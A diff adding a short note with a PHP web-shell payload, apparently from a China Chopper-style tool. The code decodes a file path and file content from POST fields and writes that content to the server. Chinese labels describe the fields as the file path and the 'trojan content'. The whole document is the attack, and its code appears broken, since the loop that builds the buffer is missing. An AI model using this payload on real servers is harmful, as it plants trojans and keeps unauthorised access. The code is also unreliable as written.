@@ -1,0 +1,17 @@
+z0
+
+```
+@ini_set("display_errors","0"); @set_time_limit(0); @set_magic_quotes_runtime(0);echo("->|");;
+$f=base64_decode($_POST["z1"]);
+$c=base64_decode($_POST["z2"]);
+$c=str_replace("\r","",$c);
+$c=str_replace("\n","",$c);
+$buf="";
+$buf.=substr($c,$i,1);
+echo(@fwrite(fopen($f,"w"),$buf));
+echo("|<-");
+die();
+```
+
+z1  文件名加路径
+z2  木马内容
